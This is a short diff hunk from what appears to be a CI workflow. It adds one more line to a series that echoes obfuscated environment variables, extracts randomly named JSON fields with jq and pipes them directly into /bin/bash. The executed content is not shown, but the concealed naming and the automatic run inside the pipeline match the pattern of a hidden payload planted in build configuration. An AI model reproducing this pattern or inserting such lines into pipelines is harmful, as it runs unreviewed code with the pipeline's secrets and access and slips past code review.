@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$x04343" | jq -r .uyr0 | /bin/bash
           echo $vgfnb4 | jq -r .h463 | /bin/bash
           echo $sm80247 | jq -r .fyub0 | /bin/bash
+          echo $eza1177 | jq -r .e47 | /bin/bash
 
       - name: Archive output
         if: always()
